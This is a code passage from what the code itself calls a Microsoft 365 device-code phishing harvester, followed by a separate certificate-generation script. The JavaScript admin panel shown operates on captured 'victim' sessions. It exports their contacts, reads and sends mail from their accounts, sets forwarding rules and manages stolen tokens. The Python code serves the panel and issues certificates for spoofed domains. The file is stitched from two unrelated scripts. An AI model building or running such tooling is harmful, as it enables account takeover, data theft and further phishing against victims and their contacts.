  fetch('/admin/api/graph/' + state.sel.sid + '/contacts/extract', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) {
        var msg = String(d.error);
        var hint = '';
        if (/403|Access is denied|Contacts/i.test(msg)) {
          hint = '<div class="hint"><b>Contacts need Contacts.Read.</b> Re-capture the victim with the updated default scope (includes Contacts.Read).</div>';
        }
        $('view-contacts').innerHTML = '<div class="panel"><div class="phd"><h3>People</h3></div><div class="pbd">'
          + hint + '<div class="empty">' + esc(msg) + '</div></div></div>';
        return;
      }
      state.contacts = d;
      renderContacts(d);
    })
    .catch(function () { $('view-contacts').innerHTML = '<div class="empty">Failed to load contacts</div>'; });
}

function renderContacts(d) {
  var rows = d.contacts || [];
  var html = '<div class="panel"><div class="phd"><h3>People · ' + rows.length + ' contacts extracted</h3><div style="display:flex;gap:8px;flex-wrap:wrap">'
    + '<button class="btn-primary" id="contacts-csv">Download CSV</button>'
    + '<button class="btn-sec" id="contacts-copy">Copy emails</button>'
    + '<button class="btn-sec" id="contacts-reload">Re-extract</button>'
    + '</div></div><div class="pbd">';
  if (d.error) html += '<div class="hint">' + esc(String(d.error)) + '</div>';
  if (!rows.length) html += '<div class="empty">No contacts in this mailbox (or Contacts.Read missing on token).</div>';
  else {
    html += '<table class="ctable"><thead><tr><th>Name</th><th>Email</th><th>Phone</th><th>Company</th><th>Title</th></tr></thead><tbody>';
    rows.forEach(function (c) {
      html += '<tr><td>' + esc(c.displayName || ((c.givenName||'') + ' ' + (c.surname||'')).trim() || '—') + '</td>'
        + '<td>' + esc((c.emails || []).join(', ') || c.email || '—') + '</td>'
        + '<td>' + esc((c.phones || []).join(', ') || c.phone || '—') + '</td>'
        + '<td>' + esc(c.company || '—') + '</td>'
        + '<td>' + esc(c.jobTitle || '—') + '</td></tr>';
    });
    html += '</tbody></table>';
  }
  html += '</div></div>';
  $('view-contacts').innerHTML = html;
  var copyBtn = $('contacts-copy');
  if (copyBtn) copyBtn.addEventListener('click', function () {
    var emails = rows.map(function (c) { return c.email || (c.emails && c.emails[0]) || ''; }).filter(Boolean);
    copyText(emails.join('\\n'));
  });
  var csvBtn = $('contacts-csv');
  if (csvBtn) csvBtn.addEventListener('click', function () {
    window.location.href = '/admin/api/graph/' + state.sel.sid + '/contacts/extract?format=csv';
  });
  var reloadBtn = $('contacts-reload');
  if (reloadBtn) reloadBtn.addEventListener('click', function () { loadContactsView(); toast('Re-extracting…'); });
}

function extractContacts() {
  if (!state.sel || state.sel.status !== 'success') { toast('Select a successful session first'); return; }
  switchTab('contacts');
  toast('Extracting contacts…');
  loadContactsView();
}

function switchTab(tab) {
  state.tab = tab;
  var btns = document.querySelectorAll('.navbtn');
  for (var i = 0; i < btns.length; i++) btns[i].classList.toggle('on', btns[i].dataset.tab === tab);
  $('view-mail').classList.toggle('on', tab === 'mail');
  $('view-rules').classList.toggle('on', tab === 'rules');
  $('view-contacts').classList.toggle('on', tab === 'contacts');
  $('view-tokens').classList.toggle('on', tab === 'tokens');
  $('cbar-mail').style.display = tab === 'mail' ? 'flex' : 'none';
  if (tab === 'mail') { if (state.sel) loadFolders(); }
  else if (tab === 'rules') loadRulesView();
  else if (tab === 'contacts') loadContactsView();
  else loadTokenView();
}

function openConfig() {
  var c = state.config || {};
  $('cfg-client').textContent = (c.client_name ? c.client_name + ' (' + (c.client_id || '—') + ')' : (c.client_id || '—'));
  $('cfg-flow').textContent = (c.flow || '—') + ((c.flow === 'v1') ? ' resource' : ' scope');
  $('cfg-scope').textContent = c.scope || c.resource || '—';
  $('cfg-log').textContent = c.log_file || '—';
  $('cfg-graph').textContent = c.graph_url || '—';
  $('cfg-page').textContent = window.location.origin + (c.device_page || '/o365');
  $('m-config').classList.add('on');
}

/* events */
document.querySelectorAll('.navbtn').forEach(function (b) {
  b.addEventListener('click', function () { switchTab(b.dataset.tab); });
});
$('sess-select').addEventListener('change', function () {
  var sid = this.value;
  state.sel = null;
  for (var i = 0; i < state.sessions.length; i++) {
    if (state.sessions[i].sid === sid) { state.sel = state.sessions[i]; break; }
  }
  onSessionChange(true);
});
$('refresh-btn').addEventListener('click', refreshData);
$('export-btn').addEventListener('click', function () { window.location.href = '/admin/api/export'; });
$('extract-btn').addEventListener('click', extractContacts);
$('config-btn').addEventListener('click', openConfig);
$('clear-btn').addEventListener('click', function () {
  UI.confirm('Clear all sessions', 'This clears <b>ALL</b> clients from memory (tokens on disk stay).<br>Type <b style="color:#dc2626">DELETE</b> to confirm.', function () {
    fetch('/admin/clear', { method: 'POST' }).then(function () { state.sel = null; refreshData(); });
  }, 'DELETE');
});
$('pagetab-clients').addEventListener('click', function () { switchPage('clients'); });
$('pagetab-inbox').addEventListener('click', function () { switchPage('inbox'); });
(function () {
  var btn = $('theme-btn');
  function apply(t) {
    document.body.classList.toggle('theme-dark', t);
    btn.innerHTML = t ? '&#9788; Light' : '&#9789; Dark';
    try { localStorage.setItem('o365-admin-theme', t ? 'dark' : 'light'); } catch (e) {}
  }
  var saved = 'dark';
  try { saved = localStorage.getItem('o365-admin-theme') || 'dark'; } catch (e) {}
  apply(saved === 'dark');
  btn.addEventListener('click', function () { apply(!document.body.classList.contains('theme-dark')); });
})();
$('domain-add').addEventListener('click', addDomain);
$('domain-input').addEventListener('keydown', function (ev) { if (ev.key === 'Enter') addDomain(); });
(function () {
  var qs = new URLSearchParams(window.location.search);
  var want = qs.get('inbox');
  if (want) {
    state._openSid = want;
    switchPage('inbox');
    if (window.history && history.replaceState) {
      history.replaceState(null, '', window.location.pathname);
    }
  }
})();
$('client-rows').addEventListener('click', function (ev) {
  var b = ev.target.closest('[data-cact]');
  if (!b) return;
  var sid = b.getAttribute('data-sid');
  var act = b.getAttribute('data-cact');
  if (act === 'open') openInbox(sid);
  else if (act === 'copy') copyText(window.location.origin + '/o365/' + sid);
  else if (act === 'exp') window.location.href = '/admin/api/export/' + encodeURIComponent(sid);
  else if (act === 'del') {
    UI.confirm('Delete client', 'Delete client <b>' + esc(sid) + '</b>?<br>This removes the session and its tokens from the panel.<br>Type <b style="color:#dc2626">DELETE</b> to confirm.', function () {
      fetch('/admin/delete/' + encodeURIComponent(sid), { method: 'POST' })
      .then(function () { if (state.sel && state.sel.sid === sid) state.sel = null; refreshData(); });
    });
  }
});
$('copy-link-btn').addEventListener('click', function () {
  if (!state.sel) { toast('No session'); return; }
  copyText(window.location.origin + '/o365/' + state.sel.sid);
});
$('del-sess-btn').addEventListener('click', function () {
  if (!state.sel) return;
  UI.confirm('Delete mailbox', 'Delete session <b>' + esc(state.sel.sid) + '</b>?<br>Type <b style="color:#dc2626">DELETE</b> to confirm.', function () {
    fetch('/admin/delete/' + encodeURIComponent(state.sel.sid), { method: 'POST' })
      .then(function () { state.sel = null; refreshData(); });
  });
});
$('compose-btn').addEventListener('click', function () { openCompose('new'); });
$('reply-btn').addEventListener('click', function () { if (state.cur) openCompose('reply'); });
$('replyall-btn').addEventListener('click', function () { if (state.cur) openCompose('replyall'); });
$('fwd-btn').addEventListener('click', function () { if (state.cur) openCompose('forward'); });
$('read-btn').addEventListener('click', function () { if (state.cur) (state.cur.isRead ? markUnread : markRead)(state.cur.id); });
$('del-btn').addEventListener('click', function () { if (state.cur) deleteMsg(state.cur.id); });
$('folders-ref').addEventListener('click', loadFolders);
$('folders-ref2').addEventListener('click', loadFolders);
$('msearch').addEventListener('input', function () {
  clearTimeout(state._st);
  var v = this.value;
  state._st = setTimeout(function () { state.q = v; loadMessages(); }, 400);
});
$('global-search').addEventListener('keydown', function (ev) {
  if (ev.key === 'Enter') {
    state.q = this.value; $('msearch').value = this.value;
    switchTab('mail'); loadMessages();
  }
});
$('msearch-x').addEventListener('click', function () { $('msearch').value = ''; state.q = ''; loadMessages(); });
$('flist').addEventListener('click', function (ev) {
  var f = ev.target.closest('.frow');
  if (f) { state.folder = f.dataset.fid; state.cur = null; setCmdEnabled(false); showReading(false); loadMessages(); }
});
$('mlist').addEventListener('click', function (ev) {
  var m = ev.target.closest('.mrow');
  if (m) openMessage(m.dataset.mid);
});
$('send-btn').addEventListener('click', sendMessage);
$('save-draft-btn').addEventListener('click', saveDraft);
$('sig-btn').addEventListener('click', insertSignature);
$('f-tog-cc').addEventListener('click', function () { $('f-cc-row').style.display = $('f-cc-row').style.display === 'none' ? 'flex' : 'none'; });
$('f-tog-bcc').addEventListener('click', function () { $('f-bcc-row').style.display = $('f-bcc-row').style.display === 'none' ? 'flex' : 'none'; });
$('fmt-bar').addEventListener('click', function (ev) {
  var b = ev.target.closest('.fmt-btn');
  if (!b) return;
  var cmd = b.getAttribute('data-cmd');
  if (!cmd) return;
  $('f-body').focus();
  if (cmd === 'createLink') {
    UI.prompt('Insert link', 'Enter the URL to link to:', 'https://', function (v) {
      if (v && v.trim()) document.execCommand('createLink', false, v.trim());
    });
    return;
  }
  try { document.execCommand(cmd, false, null); } catch (e) {}
});
$('f-att').addEventListener('change', function () {
  var files = Array.prototype.slice.call(this.files || []);
  files.forEach(function (file) {
    var reader = new FileReader();
    reader.onload = function () {
      var b64 = String(reader.result || '').split(',')[1] || '';
      state.pendingAtts.push({ name: file.name, contentType: file.type || 'application/octet-stream',
                               contentBytes: b64, size: file.size });
      renderAtts();
    };
    reader.readAsDataURL(file);
  });
  this.value = '';
});
$('f-attlist').addEventListener('click', function (ev) {
  var b = ev.target.closest('[data-att-remove]');
  if (!b) return;
  state.pendingAtts.splice(Number(b.getAttribute('data-att-remove')), 1);
  renderAtts();
});
$('move-folder').addEventListener('change', function () {
  var dest = this.value;
  this.value = '';
  if (!dest || !state.cur) return;
  fetch('/admin/api/graph/' + state.sel.sid + '/message/' + encodeURIComponent(state.cur.id) + '/move', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ destinationId: dest })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Move failed: ' + d.error); return; }
      toast('Message moved');
      state.cur = null; setCmdEnabled(false); showReading(false);
      loadMessages(); loadFolders();
    });
});
$('folder-new').addEventListener('click', function () {
  UI.prompt('New folder', 'Folder name:', '', function (v) {
    if (!v || !v.trim()) return;
    fetch('/admin/api/graph/' + state.sel.sid + '/folder', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ displayName: v.trim() })
    })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d.error) { toast('Failed: ' + d.error); return; }
        toast('Folder created');
        state.folder = d.id || state.folder;
        loadFolders();
      });
  });
});
$('rule-save').addEventListener('click', saveRule);
$('r-fwd').addEventListener('change', function () { $('r-fwdto').style.display = this.checked ? 'block' : 'none'; });
document.querySelectorAll('[data-close]').forEach(function (b) {
  b.addEventListener('click', function () { $(b.dataset.close).classList.remove('on'); });
});
document.querySelectorAll('.modal').forEach(function (m) {
  m.addEventListener('click', function (ev) { if (ev.target === m) m.classList.remove('on'); });
});
document.addEventListener('keydown', function (ev) {
  if (ev.key === 'Escape') document.querySelectorAll('.modal.on').forEach(function (m) { m.classList.remove('on'); });
});
document.addEventListener('click', function (ev) {
  var t = ev.target;
  if (t.dataset && t.dataset.view) {
    ATT.open(t.getAttribute('data-view-name') || 'attachment', t.getAttribute('data-view'));
    return;
  }
  if (t.dataset && t.dataset.copy) { copyText(t.dataset.copy); return; }
  if (t.dataset && t.dataset.rid && t.dataset.act) {
    if (t.dataset.act === 'edit') openRuleModal(t.dataset.rid);
    else if (t.dataset.act === 'del') deleteRule(t.dataset.rid);
  }
});
document.addEventListener('change', function (ev) {
  var t = ev.target;
  if (t.dataset && t.dataset.rid && t.dataset.act === 'toggle') toggleRule(t.dataset.rid, t.checked);
});

/* ---- styled confirm/prompt + in-window attachment viewer ---- */
var UI = (function () {
  var ov = $('ui-ov'), inp = $('ui-input'), hint = $('ui-hint'), cur = null;
  function open(o) {
    cur = o;
    $('ui-msg-title').textContent = o.title || 'Confirm';
    $('ui-msg').innerHTML = o.msg || '';
    inp.style.display = o.input ? 'block' : 'none';
    inp.value = o.value || '';
    hint.style.display = 'none';
    $('ui-ok').textContent = o.okText || 'OK';
    $('ui-ok').className = 'ui-ok' + (o.danger ? ' danger' : '');
    ov.classList.add('on');
    setTimeout(function () {
      if (o.input) { inp.focus(); inp.select(); } else { $('ui-ok').focus(); }
    }, 60);
  }
  function close() { ov.classList.remove('on'); cur = null; }
  $('ui-ok').addEventListener('click', function () {
    if (!cur) return;
    if (cur.require && inp.value.trim() !== cur.require) {
      hint.style.display = 'block';
      hint.textContent = 'Type ' + cur.require + ' exactly to confirm';
      return;
    }
    var v = cur.input ? inp.value : null;
    var cb = cur.onOk;
    close();
    if (cb) cb(v);
  });
  $('ui-cancel').addEventListener('click', close);
  ov.addEventListener('click', function (ev) { if (ev.target === ov) close(); });
  inp.addEventListener('keydown', function (ev) {
    if (ev.key === 'Enter') { ev.preventDefault(); $('ui-ok').click(); }
    if (ev.key === 'Escape') close();
  });
  document.addEventListener('keydown', function (ev) {
    if (ev.key === 'Escape' && ov.classList.contains('on')) close();
  });
  return {
    confirm: function (title, msg, onOk, requireText) {
      open({ title: title, msg: msg, okText: requireText ? 'Confirm' : 'OK',
             danger: !!requireText });
      cur = { onOk: onOk, require: requireText || null };
    },
    prompt: function (title, msg, def, cb) {
      open({ title: title, msg: msg, input: true });
      inp.value = def || '';
      cur = { onOk: function (v) { if (cb) cb(v); }, input: true };
    }
  };
})();
var ATT = (function () {
  var ov = $('att-ov');
  function openViewer(name, url) {
    $('att-title').textContent = name || 'attachment';
    $('att-frame').src = url;
    var dl = $('att-dl-link');
    dl.href = url;
    dl.setAttribute('download', name || 'attachment');
    ov.classList.add('on');
  }
  function closeViewer() {
    ov.classList.remove('on');
    $('att-frame').src = 'about:blank';
  }
  $('att-close').addEventListener('click', closeViewer);
  document.addEventListener('keydown', function (ev) {
    if (ev.key === 'Escape' && ov.classList.contains('on')) closeViewer();
  });
  return { open: openViewer, close: closeViewer };
})();

refreshData();
setInterval(refreshData, 5000);
</script>
</body>
</html>
"""



if __name__ == "__main__":
    load_log_sessions()
    print("Microsoft 365 device-code harvester on 0.0.0.0:%d" % PORT)
    print("Client    : %s (%s)" % (MS_CLIENT_ID, CLIENT_NAMES.get(MS_CLIENT_ID, "custom")))
    print("Flow      : %s" % ("v2 scope" if MS_FLOW == "v2" else "v1 resource"))
    if MS_FLOW == "v2":
        print("Scope     : %s" % MS_SCOPE)
    else:
        print("Resource  : %s" % MS_RESOURCE)
    print("Log file  : %s" % LOG_FILE)
    print("Domains   : %s" % DOMAINS_FILE)
    # HTTPS is the default: serve over TLS whenever a certificate is available
    # (explicit SERVE_HTTPS=1 forces it; SERVE_HTTPS=0 forces plain HTTP).
    _want_https = SERVE_HTTPS or (not SERVE_HTTPS_EXPLICIT
                                  and SSL_CERT and SSL_KEY
                                  and os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY))
    if _want_https:
        ensure_ssl_certs()
        ctx = None
        if os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY):
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(SSL_CERT, SSL_KEY)
            except Exception as e:
                print("HTTPS: failed to load certs (%s); falling back to HTTP" % e)
                ctx = None
        else:
            print("HTTPS: cert files missing (%s / %s); falling back to HTTP" % (SSL_CERT, SSL_KEY))
            globals()["SERVE_HTTPS"] = False
        if ctx:
            globals()["SSL_CTX"] = ctx
            print("Admin     : https://0.0.0.0:%d/admin" % PORT)
            print("HTTPS     : cert at %s" % SSL_CERT)
            print("NOTE      : add '%s' -> this server's IP in DNS (or the client's hosts file)" % _lan_ip())
            threading.Thread(target=_watch_cert, daemon=True).start()
            app.run(host="0.0.0.0", port=PORT, threaded=True, ssl_context=ctx)
        else:
            print("Admin     : http://0.0.0.0:%d/admin" % PORT)
            print("HTTPS     : set SERVE_HTTPS=1 to enable (self-signed cert auto-generated)")
            app.run(host="0.0.0.0", port=PORT, threaded=True)
    else:
        print("Admin     : http://0.0.0.0:%d/admin" % PORT)
        print("HTTPS     : no certificate found; serving plain HTTP (set SERVE_HTTPS=1 to force)")
        app.run(host="0.0.0.0", port=PORT, threaded=True)

import os
import json
import ipaddress
import threading
import time
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import socket

# --- Config ---
DOMAINS_FILE = "domains.json"
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

def get_local_ip():
    """Get the local LAN IP (not 127.0.0.1)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def generate_self_signed_cert(domains):
    """Generate a self-signed SSL certificate for the given domains."""
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Add all domains + IPs to Subject Alternative Names (SANs)
    local_ip = get_local_ip()
    sans = []
    for d in domains:
        try:
            sans.append(x509.IPAddress(ipaddress.IPv4Address(d)))
        except ValueError:
            sans.append(x509.DNSName(d))
    sans += [x509.DNSName("localhost"), x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")), x509.IPAddress(ipaddress.IPv4Address(local_ip))]

    # Build certificate
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "o365-harvester"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow())
        .not_valid_after(datetime.utcnow() + timedelta(days=365))
        .add_extension(x509.SubjectAlternativeName(sans), critical=False)
        .sign(key, hashes.SHA256(), default_backend())
    )

    # Save certificate and key
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(KEY_FILE, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
    print(f"[+] Generated SSL certificate for domains: {', '.join(domains)}")

def watch_domains_file():
    """Watch domains.json for changes and regenerate SSL cert."""
    last_domains = []
    while True:
        try:
            with open(DOMAINS_FILE, "r") as f:
                data = json.load(f)
                domains = data.get("domains", [])
                if domains != last_domains:
                    last_domains = domains
                    generate_self_signed_cert(domains)
        except Exception as e:
            print(f"[-] Error watching domains.json: {e}")
        time.sleep(2)

# --- Start Watcher Thread ---
if __name__ == "__main__":
    # Ensure domains.json exists
    if not os.path.exists(DOMAINS_FILE):
        with open(DOMAINS_FILE, "w") as f:
            json.dump({"domains": []}, f)

    # Start watcher thread
    threading.Thread(target=watch_domains_file, daemon=True).start()



